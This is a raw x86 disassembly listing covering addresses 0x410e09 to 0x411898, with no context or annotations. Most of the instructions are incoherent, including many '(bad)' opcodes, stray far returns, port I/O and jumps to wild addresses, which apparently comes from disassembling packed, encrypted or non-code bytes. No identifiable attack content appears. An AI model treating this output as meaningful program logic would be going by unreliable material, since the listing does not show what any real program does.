  410e09:	lea    eax,[ebx]
  410e0b:	sbb    al,0x34
  410e0d:	push   0x3f
  410e0f:	pop    edx
  410e10:	add    al,0x6a
  410e12:	cmovno esi,DWORD PTR ds:[eax+0x3d35b0e]
	...
  410e42:	add    BYTE PTR [eax],al
  410e44:	retf   
  410e45:	sbb    BYTE PTR [ecx],ch
  410e47:	xor    al,0x91
  410e49:	dec    eax
  410e4a:	je     0x410e8b
  410e4c:	call   FWORD PTR [edx-0x1e]
  410e4f:	ret    
  410e50:	or     eax,0xba496a29
  410e55:	pop    ebx
  410e56:	mov    ch,0x17
  410e58:	mov    ebp,0xf203d8f0
  410e5d:	bound  esp,QWORD PTR [edx+0x31]
  410e60:	dec    esi
  410e61:	cmc    
  410e62:	sub    eax,0x1e5b1906
  410e67:	push   ecx
  410e68:	inc    esi
  410e69:	outs   dx,BYTE PTR ds:[esi]
  410e6a:	fwait
  410e6b:	mov    ecx,DWORD PTR [eax-0x18]
  410e6e:	dec    esp
  410e6f:	retf   
  410e70:	retf   0x915e
  410e73:	push   es
  410e74:	ds jle 0x410eb5
  410e77:	fmul   st(6),st
  410e79:	outs   dx,BYTE PTR ds:[esi]
  410e7a:	cmc    
  410e7b:	retf   0xe828
  410e7e:	sub    al,0xdc
  410e80:	adc    ecx,DWORD PTR [edi]
  410e82:	jmp    0xb129278a
  410e87:	fist   DWORD PTR [ebx]
  410e89:	in     al,dx
  410e8a:	aad    0xca
  410e8c:	or     al,ch
  410e8e:	mov    eax,0xc5ec0bdb
  410e93:	retf   0xa49b
  410e96:	stos   BYTE PTR es:[edi],al
  410e97:	div    ecx
  410e99:	push   es
  410e9a:	(bad)  
  410e9b:	xlat   BYTE PTR ds:[ebx]
  410e9c:	mov    esp,0x7a78a096
  410ea1:	outs   dx,DWORD PTR ds:[esi]
  410ea2:	cmp    BYTE PTR [edi+eiz*1-0x6],bl
  410ea6:	daa    
  410ea7:	add    al,0x0
	...
  410ed1:	add    BYTE PTR [eax+ebx*2+0x3],ah
  410ed5:	add    al,0x56
  410ed7:	push   esp
  410ed8:	or     al,BYTE PTR [ebp+0x3e]
  410edb:	or     DWORD PTR [edx+0x645b3e28],0xffffffc3
  410ee2:	inc    eax
  410ee3:	jecxz  0x410ee4
  410ee5:	test   al,0x3d
  410ee7:	pop    ebx
  410ee8:	add    BYTE PTR [edx+0x6e],ah
  410eeb:	outs   dx,DWORD PTR ds:[esi]
  410eec:	mov    bh,bl
  410eee:	push   ss
  410eef:	pop    ss
  410ef0:	clc    
  410ef1:	mov    ecx,0x56fbe684
  410ef6:	push   ebx
  410ef7:	dec    edi
  410ef8:	test   DWORD PTR [ecx],ebp
  410efa:	test   ch,dl
  410efc:	popf   
  410efd:	jmp    0xbcc46a3f
  410f02:	test   DWORD PTR [ebp+0xd],ebp
  410f05:	ins    DWORD PTR es:[edi],dx
  410f06:	fldcw  WORD PTR [ebp-0x2]
  410f09:	jmp    0xea15258a
  410f0e:	cmp    eax,0xfe26005b
  410f13:	xchg   edx,eax
  410f14:	(bad)  
  410f15:	call   0xa5086a57
  410f1a:	lea    esi,ds:0x943de900
  410f20:	inc    esp
  410f21:	sub    eax,0xe9005b3d
  410f26:	test   al,0x7
  410f28:	clc    
  410f29:	bound  ebp,QWORD PTR [ebx]
  410f2b:	loopne 0x410f71
  410f2d:	mov    ch,0x52
  410f2f:	fiadd  WORD PTR [ecx+edi*4+0x4a]
  410f33:	add    DWORD PTR [ecx],eax
  410f35:	(bad)  
	...
  410f5e:	add    BYTE PTR [eax],al
  410f60:	jns    0x410fd5
  410f62:	(bad)  
  410f63:	cmp    eax,DWORD PTR [esi]
  410f65:	(bad)  
  410f66:	sar    BYTE PTR [esi+ebp*1],0xd8
  410f6a:	jl     0x410f19
  410f6c:	cmp    eax,0x816a4de6
  410f71:	xchg   edi,edi
  410f73:	xor    al,0x7c
  410f75:	add    ecx,DWORD PTR [ecx+0xa]
  410f78:	jge    0x410fd5
  410f7a:	call   DWORD PTR [esi+ecx*4]
  410f7d:	je     0x410f6d
  410f7f:	xor    al,0x42
  410f81:	pop    ebx
  410f82:	or     ebp,DWORD PTR [ecx+0x66616e]
  410f88:	call   0x2e410fe4
  410f8d:	sub    al,0xc8
  410f8f:	jmp    0x410f29
  410f91:	fwait
  410f92:	inc    ebx
  410f93:	enter  0x5897,0x0
  410f97:	add    BYTE PTR [eax],ah
  410f99:	sbb    al,0xc8
  410f9b:	jmp    FWORD PTR [edx-0x44]
  410f9e:	std    
  410f9f:	jne    0x410f40
  410fa1:	nop
  410fa2:	in     al,0xfd
  410fa4:	lock mov eax,ds:0x8f5b75fd
  410faa:	cmp    BYTE PTR [ebp+0x67],bl
  410fad:	pop    eax
  410fae:	cmp    DWORD PTR [ebp+0x4f],0x57
  410fb2:	je     0x410fbc
  410fb4:	adc    BYTE PTR [eax+ebx*8],bl
  410fb7:	call   0x41452f
  410fbc:	sub    al,0xf3
  410fbe:	mov    DWORD PTR [ebp+0x2f],edx
  410fc1:	out    dx,al
  410fc2:	adc    bh,bh
	...
  410fec:	add    BYTE PTR [eax],al
  410fee:	stos   BYTE PTR es:[edi],al
  410fef:	mov    al,ds:0xef2f52fd
  410ff4:	push   ebx
  410ff5:	cld    
  410ff6:	lods   al,BYTE PTR ds:[esi]
  410ff7:	gs std 
  410ff9:	jne    0x41102e
  410ffb:	mov    ds:0x955e0850,eax
  411000:	add    al,BYTE PTR [eax]
  411002:	pop    edx
  411003:	out    dx,al
  411004:	jmp    0x3283:0x5477db83
  41100b:	in     al,0x61
  41100d:	inc    ecx
  41100e:	pop    ss
  41100f:	pop    eax
  411010:	jne    0x411030
  411012:	test   al,0x6c
  411014:	mov    esp,DWORD PTR [ebx+0x26]
  411017:	push   edi
  411018:	add    DWORD PTR [eax],eax
  41101a:	xlat   BYTE PTR ds:[ebx]
  41101b:	push   edi
  41101c:	mov    esi,0x187491
  411021:	jmp    0x41100b
  411023:	stc    
  411024:	shl    BYTE PTR [esi],0xe5
  411027:	(bad)  
  411028:	les    eax,FWORD PTR [edx]
  41102a:	ds pop esp
  41102c:	test   DWORD PTR ds:0x82d5473e,edi
  411032:	jnp    0x41107f
  411034:	cmp    eax,0xf7823e41
  411039:	and    DWORD PTR [ebp-0x42fffd7f],0xffffffbe
  411040:	pop    ebp
  411041:	dec    ebx
  411042:	inc    DWORD PTR [ecx+0x1bba0f02]
  411048:	add    eax,DWORD PTR [eax]
  41104a:	add    DWORD PTR ds:[esi],eax
  41104d:	popf   
  41104e:	cmc    
  41104f:	ret    0x2
	...
  41107a:	add    BYTE PTR [eax],al
  41107c:	dec    ecx
  41107d:	(bad)  
  41107e:	loope  0x41107f
  411080:	jno    0x411003
  411082:	mov    edi,0x2816a44
  411087:	add    BYTE PTR [esi],bh
  411089:	xor    eax,0x823ef83e
  41108e:	add    al,BYTE PTR [eax]
  411090:	ret    
  411091:	mov    dh,0xc6
  411093:	dec    edi
  411094:	mov    ebx,0xd44fcabe
  411099:	sbb    DWORD PTR [edx-0x25],0xff02b39d
  4110a0:	dec    ebx
  4110a1:	fistp  QWORD PTR [ebx]
  4110a3:	inc    ecx
  4110a4:	ds jge 0x411069
  4110a7:	push   cs
  4110a8:	mov    edx,0x3e000332
  4110ad:	cmc    
  4110ae:	dec    eax
  4110af:	clc    
  4110b0:	ds jns 0x411131
  4110b3:	stos   DWORD PTR es:[edi],eax
  4110b4:	ds je  0x4110b9
  4110b7:	add    DWORD PTR [ebx-0x3df0fc68],0xffffffd6
  4110be:	add    eax,DWORD PTR [eax]
  4110c0:	ds in  eax,dx
  4110c2:	push   eax
  4110c3:	cld    
  4110c4:	xlat   BYTE PTR ds:[ebx]
  4110c5:	test   BYTE PTR [ebx],0x0
  4110c8:	ds push edx
  4110ca:	jnp    0x411101
  4110cc:	fstp   DWORD PTR [ebx+0x1f]
  4110cf:	in     al,dx
  4110d0:	shl    BYTE PTR [eax],0x99
  4110d3:	(bad)  
  4110d4:	push   ebx
  4110d5:	inc    edi
  4110d6:	inc    cx
  4110d8:	retf   0x77f3
  4110db:	arpl   di,di
  4110dd:	pop    edx
  4110de:	xchg   ecx,eax
  4110df:	in     eax,dx
	...
  411108:	add    BYTE PTR [eax],al
  41110a:	adc    eax,0x89b4e95b
  41110f:	fisubr WORD PTR [eax-0x76df48fe]
  411115:	pop    esp
  411116:	scas   eax,DWORD PTR es:[edi]
  411117:	(bad)  
  411118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411119:	add    eax,ecx
  41111b:	and    BYTE PTR [ebp-0x41],al
  41111e:	add    dh,BYTE PTR [edi-0x18]
  411121:	add    edi,DWORD PTR [esi]
  411123:	pop    ebx
  411124:	pop    esp
  411125:	inc    ecx
  411126:	or     dx,bx
  411129:	add    al,0xe4
  41112b:	pop    edx
  41112c:	rol    DWORD PTR [ebx],cl
  41112e:	mov    ebx,0xd4344920
  411133:	pop    edx
  411134:	pop    esp
  411135:	inc    ecx
  411136:	dec    esi
  411137:	or     esp,DWORD PTR [esi]
  411139:	icebp  
  41113a:	mov    dl,0x16
  41113c:	test   al,0x3
  41113e:	xor    eax,0xbd189c9b
  411143:	call   0x42f31544
  411148:	inc    ecx
  411149:	add    eax,0xfae95b3e
  41114e:	jmp    0xab07f041
  411153:	push   ebx
  411154:	out    dx,al
  411155:	push   eax
  411156:	es push 0x5b
  411159:	fcom   DWORD PTR [eax]
  41115b:	icebp  
  41115c:	lock pop ebx
  41115e:	inc    edx
  41115f:	pop    ebx
  411160:	mov    BYTE PTR [ebp-0x392d4fe7],0xf8
  411167:	imul   edi,DWORD PTR [ebx],0x2283d9d8
  41116d:	add    al,0x0
	...
  411197:	add    BYTE PTR [esi],bh
  411199:	or     DWORD PTR [eax],eax
  41119b:	mov    dh,0x26
  41119d:	arpl   WORD PTR [edx+0x7cdcd9a7],ax
  4111a3:	mov    eax,ds:0x6a08ef3d
  4111a8:	inc    ebx
  4111a9:	pop    ebx
  4111aa:	(bad)  
  4111ac:	push   0x808efe6a
  4111b1:	out    dx,al
  4111b2:	sti    
  4111b3:	xchg   BYTE PTR [esi+0x42284af2],ch
  4111b9:	or     ecx,ecx
  4111bb:	stos   DWORD PTR es:[edi],eax
  4111bc:	mov    eax,ds:0x71625369
  4111c1:	fadd   st(3),st
  4111c3:	popa   
  4111c4:	neg    DWORD PTR [edx+0x6a]
  4111c7:	push   cs
  4111c8:	sub    esi,0xf56c4107
  4111ce:	dec    BYTE PTR [esi-0x6]
  4111d1:	push   ds
  4111d2:	cld    
  4111d3:	push   0x46
  4111d5:	mov    al,0x4a
  4111d7:	test   al,0x3d
  4111d9:	pop    ebx
  4111da:	je     0x4111d2
  4111dc:	mov    al,ds:0x3de9f81e
  4111e1:	pop    ebx
  4111e2:	add    dl,dl
  4111e4:	jge    0x4111ff
  4111e6:	push   eax
  4111e7:	mov    ecx,0xbbf80ec6
  4111ec:	js     0x41123c
  4111ee:	mov    ch,0xa2
  4111f0:	sbb    BYTE PTR [ebx-0x7b],0x29
  4111f4:	sbb    BYTE PTR [ebp-0x15],0xca
  4111f8:	mov    esp,0xe9f7e7
	...
  411225:	add    BYTE PTR [esi+0x75d2eb5d],cl
  41122b:	retf   0x29a2
  41122e:	cmp    ch,BYTE PTR [eax+0x74]
  411231:	loope  0x411236
  411233:	lock pop es
  411235:	shr    DWORD PTR [edi+0x62],0xfe
  411239:	into   
  41123a:	ja     0x41124b
  41123c:	clc    
  41123d:	add    BYTE PTR [ebp+ebp*2-0x3],ch
  411241:	jne    0x411242
  411243:	sahf   
  411244:	push   eax
  411245:	or     BYTE PTR [eax+0x10e80818],ch
  41124b:	mov    al,ds:0x1898fffd
  411250:	or     al,ch
  411252:	jg     0x4111f5
  411254:	std    
  411255:	jmp    FWORD PTR [eax+0x52fffc18]
  41125b:	addr16 out 0xd3,al
  41125e:	dec    ebx
  41125f:	sahf   
  411260:	std    
  411261:	leave  
  411262:	aad    0x5b
  411264:	add    BYTE PTR [ebp+0x1c],dl
  411267:	add    DWORD PTR [ecx+0x573917c4],0x53
  41126e:	or     al,0x38
  411270:	or     al,0xc7
  411272:	xchg   ebp,eax
  411273:	pop    esp
  411274:	add    BYTE PTR [eax],al
  411276:	xchg   edi,eax
  411277:	lahf   
  411278:	jae    0x411282
  41127a:	jmp    FWORD PTR [edi+0x58]
  41127d:	add    BYTE PTR [edi-0x25],ah
  411280:	test   BYTE PTR [ecx],0xb0
  411283:	gs sub eax,eax
  411286:	int3   
  411287:	aas    
  411288:	pop    esi
  411289:	leave  
	...
  4112b2:	add    BYTE PTR [eax],al
  4112b4:	and    eax,0x2fd0fe67
  4112b9:	loop   0x41130e
  4112bb:	or     al,0xce
  4112bd:	pop    esp
  4112be:	mov    ebx,eax
  4112c0:	pop    eax
  4112c1:	fcmovu st,st(0)
  4112c3:	add    BYTE PTR [edi],ah
  4112c5:	pop    esp
  4112c6:	mov    esi,DWORD PTR [ebp+0x2f]
  4112c9:	jecxz  0x411346
  4112cb:	or     BYTE PTR [ebp+esi*1+0x66],cl
  4112cf:	mov    edx,DWORD PTR [ecx]
  4112d1:	fdiv   st(2),st
  4112d3:	xor    BYTE PTR [ebp+0x5efc7e62],dl
  4112d9:	push   ss
  4112da:	add    eax,0xeb4bfb80
  4112df:	sbb    edi,DWORD PTR [esi]
  4112e1:	repnz mov BYTE PTR [eax+0x6c],0x87
  4112e6:	cmp    bl,0x78
  4112e9:	sub    esp,edi
  4112eb:	jg     0x4112c7
  4112ed:	xor    al,BYTE PTR [ebx+eax*8+0x2af99d34]
  4112f4:	dec    BYTE PTR [ebp+eiz*1+0x5e]
  4112f8:	pop    es
  4112f9:	mov    ah,0xfa
  4112fb:	inc    DWORD PTR ds:0x2085082
  411301:	mov    ecx,DWORD PTR [ebx+0x4]
  411304:	push   0xffffff82
  411306:	xlat   BYTE PTR ds:[ebx]
  411307:	push   ss
  411308:	jb     0x41133d
  41130a:	push   edx
  41130b:	or     ch,BYTE PTR [edx+0x40]
  41130e:	dec    ebp
  41130f:	push   es
  411310:	push   edx
  411311:	xor    eax,DWORD PTR [eax]
  411313:	or     ah,BYTE PTR [ebp+0xc0177a]
	...
  411341:	add    ch,dh
  411343:	mov    al,ds:0x697cc924
  411348:	add    al,al
  41134a:	sahf   
  41134b:	jne    0x411345
  41134d:	ret    
  41134e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41134f:	mov    esp,0x6d3cc57f
  411354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411355:	je     0x4112f3
  411357:	in     al,dx
  411358:	cmp    eax,0x7361610c
  41135d:	inc    esp
  41135e:	push   esi
  41135f:	cmp    BYTE PTR [esi+0x8],cl
  411362:	shl    DWORD PTR [esi+0x4e03c6c6],0x3
  411369:	add    BYTE PTR [esi],bh
  41136b:	jb     0x4113ec
  41136d:	cmp    al,0xdb
  41136f:	mov    ecx,0xe83e0041
  411374:	sub    al,0x8d
  411376:	and    DWORD PTR [ecx+esi*1+0x6a],0x3f
  41137b:	fiadd  DWORD PTR [edx]
  41137d:	push   0x3e
  41137f:	fiadd  DWORD PTR [edx]
  411381:	push   0x3e
  411383:	pop    ebx
  411384:	je     0x4113cf
  411386:	push   es
  411387:	or     al,0xde
  411389:	sbb    DWORD PTR [ebx+0x45042812],esp
  41138f:	fwait
  411390:	push   esp
  411391:	(bad)  
  411392:	mov    esp,0x7204bce8
  411397:	das    
  411398:	jb     0x4113e3
  41139a:	xor    dl,dl
  41139c:	and    esi,DWORD PTR [esp+edx*1-0x2a11c9ad]
  4113a3:	rcr    BYTE PTR [ebx],cl
  4113a5:	mov    eax,0x0
	...
  4113ce:	add    BYTE PTR [eax],al
  4113d0:	mov    ah,0xe8
  4113d2:	lock mov ?,WORD PTR [edx+0x6b]
  4113d6:	mov    DWORD PTR [esi],eax
  4113d8:	lods   eax,DWORD PTR ds:[esi]
  4113d9:	mov    edi,0x66424961
  4113de:	sti    
  4113df:	mov    bl,0xb8
  4113e1:	pop    ebx
  4113e2:	jle    0x41141d
  4113e4:	stos   BYTE PTR es:[edi],al
  4113e5:	jae    0x4113a3
  4113e7:	pop    esp
  4113e8:	ds pop ebx
  4113ea:	xor    DWORD PTR ds:0x5ee95b3e,eax
  4113f0:	jmp    0x3a0743f9
  4113f5:	pop    ebx
  4113f6:	add    al,ah
  4113f8:	adc    al,0x6
  4113fa:	scas   eax,DWORD PTR es:[edi]
  4113fb:	int3   
  4113fc:	jg     0x411451
  4113fe:	jmp    0x69b8c95b
  411403:	enter  0xf3a1,0xe8
  411407:	jecxz  0x411462
  411409:	inc    ax
  41140b:	add    ah,al
  41140d:	gs and eax,0x9067028d
  411413:	add    ebx,DWORD PTR [esi]
  411415:	pop    ebx
  411416:	jmp    0xe3682c6
  41141b:	ret    
  41141c:	(bad)  
  41141d:	pop    ds
  41141e:	add    DWORD PTR [esi+edi*1],ebp
  411421:	cmp    ebp,ecx
  411423:	add    edx,DWORD PTR [esi]
  411425:	aas    
  411426:	add    BYTE PTR [edi-0x5b779b04],al
  41142c:	leave  
  41142d:	std    
  41142e:	dec    DWORD PTR [eax]
  411430:	inc    edx
  411431:	pop    ebx
  411432:	call   0x41152d
	...
  41145b:	add    BYTE PTR [eax],al
  41145d:	add    BYTE PTR [edi+0x66],cl
  411460:	(bad)  
  411461:	pusha  
  411462:	xchg   BYTE PTR [ebx+0x67],ch
  411465:	jmp    0xd23f7a47
  41146a:	cmp    esi,ebp
  41146c:	(bad)  
  41146d:	mov    esi,0x41ec1eb2
  411472:	inc    edx
  411473:	cmp    eax,DWORD PTR [eax]
  411475:	jmp    0xa6ad7b1f
  41147a:	cld    
  41147b:	rol    BYTE PTR [ecx+edx*4+0x15],cl
  41147f:	pop    ebx
  411480:	and    cl,ch
  411482:	cmp    eax,0x7cfcef73
  411487:	mov    BYTE PTR fs:[esi+edx*8],ch
  41148b:	fs je  0x411467
  41148e:	push   ebp
  41148f:	inc    ebx
  411490:	sub    BYTE PTR fs:[edx+0x66],al
  411494:	je     0x411503
  411496:	in     eax,0x85
  411498:	pop    eax
  411499:	jmp    0xee04eedb
  41149e:	jl     0x41148e
  4114a0:	xadd   DWORD PTR [eax-0x7],ebp
  4114a4:	inc    eax
  4114a5:	jmp    0x52390326
  4114aa:	mov    es,WORD PTR [edx]
  4114ac:	add    cl,ch
  4114ae:	mov    eax,0x16360b99
  4114b3:	dec    ebx
  4114b4:	push   0x1c19a9
  4114b9:	es push es
  4114bb:	outs   dx,DWORD PTR ds:[esi]
  4114bc:	out    0x63,eax
  4114be:	loop   0x41151a
  4114c0:	add    BYTE PTR [edx+0x0],ch
	...
  4114eb:	add    BYTE PTR [ecx],al
  4114ed:	push   ecx
  4114ee:	call   DWORD PTR [ebp+ecx*2-0x44ffa10d]
  4114f5:	pop    ds
  4114f6:	add    bh,bh
  4114f8:	stos   BYTE PTR es:[edi],al
  4114f9:	test   al,0xe6
  4114fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114fc:	scas   al,BYTE PTR es:[edi]
  4114fd:	pop    eax
  4114fe:	add    BYTE PTR [ebx+0x75ff545b],al
  411504:	pop    es
  411505:	xor    DWORD PTR [edx+0x64],esi
  411508:	push   esi
  411509:	pop    edi
  41150a:	push   DWORD PTR [ebp+0x3]
  41150d:	mov    eax,0x58e75992
  411512:	add    esp,0xfffffff3
  411515:	fwait
  411516:	jae    0x411524
  411518:	(bad)  
  411519:	xlat   BYTE PTR ds:[ebx]
  41151a:	bound  eax,QWORD PTR [ecx-0x19]
  41151d:	fwait
  41151e:	jae    0x411508
  411520:	(bad)  
  411521:	fcom   DWORD PTR [edi+0x0]
  411524:	xlat   BYTE PTR ds:[ebx]
  411525:	ffreep st(2)
  411527:	or     al,0xa0
  411529:	sub    al,0x10
  41152b:	push   0x41333b
  411530:	shr    BYTE PTR [esp+eiz*8],0xe8
  411534:	push   ecx
  411535:	add    BYTE PTR [eax],al
  411537:	add    BYTE PTR [ebx+edx*4],dl
  41153a:	or     ch,BYTE PTR [edx-0x59]
  41153d:	fwait
  41153e:	jae    0x41153c
  411540:	and    BYTE PTR [esp+ecx*1],ch
  411543:	jmp    FWORD PTR [edx]
  411545:	sahf   
  411546:	inc    esi
  411547:	inc    ecx
  411548:	xchg   edi,eax
  411549:	mov    al,0x54
  41154b:	jo     0x41155d
  41154d:	call   0x0:0x4587
	...
  411578:	add    BYTE PTR [eax],al
  41157a:	pop    es
  41157b:	xor    eax,0xa0aaff00
  411580:	std    
  411581:	jne    0x4115d6
  411583:	fwait
  411584:	xor    eax,ebx
  411586:	lahf   
  411587:	sbb    DWORD PTR [eax],eax
  411589:	call   0x403e35
  41158e:	into   
  41158f:	sbb    ebx,esp
  411591:	push   0x57
  411593:	fwait
  411594:	jae    0x41158a
  411596:	ds dec ebp
  411598:	aaa    
  411599:	or     al,0x31
  41159b:	pop    ebx
  41159d:	inc    edi
  41159e:	jg     0x411612
  4115a0:	stos   BYTE PTR es:[edi],al
  4115a1:	sub    DWORD PTR [esi-0x7c77409b],ebp
  4115a7:	dec    edx
  4115a8:	add    BYTE PTR cs:[ecx],dl
  4115ab:	out    dx,eax
  4115ac:	mov    dl,0xfe
  4115ae:	xchg   ebx,eax
  4115af:	mov    bh,BYTE PTR [edi+0x4329fd34]
  4115b5:	add    dh,ah
  4115b7:	gs xor bh,bh
  4115ba:	icebp  
  4115bb:	cli    
  4115bc:	inc    ebp
  4115bd:	aam    0x54
  4115bf:	jb     0x411580
  4115c1:	je     0x411595
  4115c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115c4:	xor    eax,0xc366d9e8
  4115c9:	inc    edi
  4115ca:	jg     0x41163e
  4115cc:	stos   BYTE PTR es:[edi],al
  4115cd:	std    
  4115ce:	pop    ecx
  4115cf:	mov    ebp,0xa27b88bf
  4115d4:	lea    eax,[esi+edi*2+0x21]
  4115d8:	shl    DWORD PTR [edx+ebx*4-0x2c],0x35
  4115dd:	or     al,0x0
	...
  411607:	add    BYTE PTR [ecx-0xb83c5a],ch
  41160d:	jno    0x4115b9
  41160f:	in     eax,0x29
  411611:	in     eax,dx
  411612:	mov    edi,0x83c5fb88
  411617:	jl     0x4115b7
  411619:	jno    0x41162a
  41161b:	test   cl,cl
  41161d:	jno    0x411621
  41161f:	add    BYTE PTR [ebp+0x40ffd68e],bh
  411625:	(bad)  
  411626:	ins    DWORD PTR es:[edi],dx
  411627:	jmp    FWORD PTR [ecx+0x71]
  41162a:	cmp    DWORD PTR [esi+ecx*4+0x71],0xf
  41162f:	test   BYTE PTR [ebp-0x3cfffd8f],bl
  411635:	mov    esi,0x5a494fc6
  41163a:	pushf  
  41163b:	xlat   BYTE PTR ds:[ebx]
  41163c:	pop    ecx
  41163d:	or     bl,BYTE PTR [eax+eax*8]
  411640:	cmp    BYTE PTR [edi+0x29],dl
  411643:	adc    BYTE PTR [edx+0x3e03e8d2],bh
  411649:	fiadd  WORD PTR [ebx+0x655221c7]
  41164f:	xchg   BYTE PTR [ecx],bl
  411651:	arpl   ax,bp
  411653:	mov    ?,WORD PTR [edx-0x6d]
  411656:	cwde   
  411657:	rcl    BYTE PTR [edx+0x2f2d08b],0x63
  41165e:	fisttp QWORD PTR [ebx]
  411660:	(bad)  
  411661:	out    0x5b,eax
  411663:	xor    DWORD PTR [edx-0x6d],0xffffffe8
  411667:	aaa    
  411668:	pop    ecx
  411669:	repz fadd DWORD PTR [ebx]
	...
  411694:	add    BYTE PTR [eax],al
  411696:	shl    DWORD PTR [ecx+0x734639bd],1
  41169c:	shr    DWORD PTR [ecx+edx*8],cl
  41169f:	bound  ebp,QWORD PTR [ebp+0x1b62de39]
  4116a5:	or     al,0xd6
  4116a7:	out    0xf,eax
  4116a9:	mov    edi,0xe01b62b8
  4116ae:	mov    al,0xe8
  4116b0:	loopne 0x41165d
  4116b2:	push   ss
  4116b3:	hlt    
  4116b4:	test   DWORD PTR [edi-0x405f1760],edi
  4116ba:	adc    dl,BYTE PTR [ebx-0x7f]
  4116bd:	pop    esi
  4116be:	daa    
  4116bf:	bound  ebp,QWORD PTR [ebp-0x41]
  4116c2:	adc    dl,BYTE PTR [edi+0x626a3965]
  4116c8:	ror    DWORD PTR [ebx],cl
  4116ca:	data16 aaa 
  4116cc:	sar    BYTE PTR [esi-0x342c9d90],0x68
  4116d3:	call   0x532bd5f0
  4116d8:	push   ecx
  4116d9:	push   ss
  4116da:	out    0x61,eax
  4116dc:	push   DWORD PTR ds:0xe9cbdfbd
  4116e2:	adc    DWORD PTR [eax-0x7d],ecx
  4116e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116e6:	jge    0x411746
  4116e8:	jne    0x4116d8
  4116ea:	les    edx,FWORD PTR [esi]
  4116ec:	int3   
  4116ed:	push   ss
  4116ee:	sub    ah,BYTE PTR [ecx+0x74]
  4116f1:	loope  0x4116c8
  4116f3:	cwde   
  4116f4:	addr16 push es
  4116f6:	loope  0x41176c
  4116f8:	or     DWORD PTR [ebx+0x0],edx
	...
  411722:	add    BYTE PTR [eax],al
  411724:	cmp    eax,0xe5e17462
  411729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41172a:	addr16 out dx,al
  41172c:	enter  0x7460,0xe5
  411730:	aad    0x5b
  411732:	ins    BYTE PTR es:[edi],dx
  411733:	fidivr WORD PTR [eax-0x5a2e8ba0]
  411739:	arpl   WORD PTR [edx-0x32],bp
  41173c:	test   al,0x60
  41173e:	je     0x4116fd
  411740:	xchg   ebp,eax
  411741:	imul   ebp,DWORD PTR [edx-0x42],0xffffff98
  411745:	pusha  
  411746:	je     0x411701
  411748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411749:	jae    0x4117b5
  41174b:	scas   al,BYTE PTR es:[edi]
  41174c:	mov    BYTE PTR [eax+0x74],ah
  41174f:	xchg   ebp,eax
  411750:	xchg   ebp,eax
  411751:	jnp    0x4117bd
  411753:	sahf   
  411754:	clc    
  411755:	pusha  
  411756:	je     0x4116d9
  411758:	in     eax,0x83
  41175a:	push   0xffffff8e
  41175c:	call   0xd5ce8bc1
  411761:	mov    ebp,DWORD PTR [edx+0x7e]
  411764:	fsub   DWORD PTR [eax+0x74]
  411767:	mov    ebp,esp
  411769:	xchg   ebx,eax
  41176a:	push   0x6e
  41176c:	enter  0x7460,0x45
  411770:	aad    0x9b
  411772:	push   0x5e
  411774:	mov    eax,0xa5317460
  411779:	mov    ds:0x60a84e6a,eax
  41177e:	je     0x411780
  411780:	inc    ebx
  411781:	mov    dh,0xb0
  411783:	imul   ebx,DWORD PTR [eax],0xffffffa1
  411786:	std    
  411787:	jne    0x411789
	...
  4117b1:	add    BYTE PTR [edi],dh
  4117b3:	mov    dh,0xa8
  4117b5:	imul   ebx,DWORD PTR [eax],0xffffffa1
  4117b8:	std    
  4117b9:	jne    0x4117c6
  4117bb:	mov    dh,0xa0
  4117bd:	imul   ebx,DWORD PTR [eax-0x5f],0xffffffc7
  4117c1:	ret    0x5d1b
  4117c4:	push   ebp
  4117c5:	mov    ebp,DWORD PTR [ebx]
  4117c7:	ffree  st(2)
  4117c9:	call   0x8e3eb6ee
  4117ce:	loop   0x411770
  4117d0:	dec    esi
  4117d1:	call   DWORD PTR [edx+0x5435ff50]
  4117d7:	adc    al,0x41
  4117d9:	add    bh,ch
  4117db:	call   0x54281835
  4117e0:	ror    BYTE PTR [edi],0x62
  4117e3:	inc    ebx
  4117e4:	add    DWORD PTR [eax],eax
  4117e6:	xlat   BYTE PTR ds:[ebx]
  4117e7:	xchg   edi,eax
  4117e8:	inc    ebx
  4117e9:	clc    
  4117ea:	xlat   BYTE PTR ds:[ebx]
  4117eb:	pop    esp
  4117ec:	add    BYTE PTR [eax],al
  4117ee:	mov    al,ds:0xe0fff418
  4117f3:	pop    esp
  4117f4:	add    BYTE PTR [edx-0x29],ch
  4117f7:	xor    al,BYTE PTR [eax]
  4117f9:	push   0xffffffd7
  4117fb:	xor    al,BYTE PTR [eax]
  4117fd:	lea    esp,[edx-0x5d]
  411800:	dec    esi
  411801:	lea    esp,[edx]
  411803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411804:	cmc    
  411805:	(bad)  
  411806:	mov    eax,0xbf75ff07
  41180b:	sahf   
  41180c:	jae    0x41180a
  41180e:	scas   eax,DWORD PTR es:[edi]
  41180f:	(bad)  
  411810:	push   ebp
  411811:	add    BYTE PTR [edi+0x74c053],ah
	...
  41183f:	add    BYTE PTR [edx-0x68ff2a4b],ah
  411845:	pop    esp
  411846:	push   0x1daf9f
  41184b:	(bad)  
  41184c:	ds jg  0x41185d
  41184f:	call   0xfefcb8da
  411854:	push   cs
  411855:	in     eax,dx
  411856:	ror    DWORD PTR [ebx+eax*8+0x51feb522],cl
  41185d:	ret    0xe850
  411860:	jbe    0x411802
  411862:	mov    ebx,0xabefb7fe
  411867:	idiv   BYTE PTR [ecx]
  411869:	inc    ecx
  41186a:	lods   al,BYTE PTR ds:[esi]
  41186b:	sbb    eax,0x8cbd49a5
  411870:	add    DWORD PTR [edx+0x54],0x68
  411874:	xor    cl,dh
  411876:	inc    ecx
  411877:	add    BYTE PTR [ecx],bl
  411879:	daa    
  41187a:	lods   al,BYTE PTR ds:[esi]
  41187b:	not    BYTE PTR [ecx]
  41187d:	imul   edi,DWORD PTR [ebx+0x41b9fd34],0x2e561600
  411887:	(bad)  
  411888:	stc    
  411889:	jmp    0x82bb:0x88e9eb85
  411890:	stos   DWORD PTR es:[edi],eax
  411891:	popf   
  411892:	mov    bl,0xfe
  411894:	loope  0x411907
  411896:	ss pop edx
  411898:	mov    ebp,0x4b03b41e
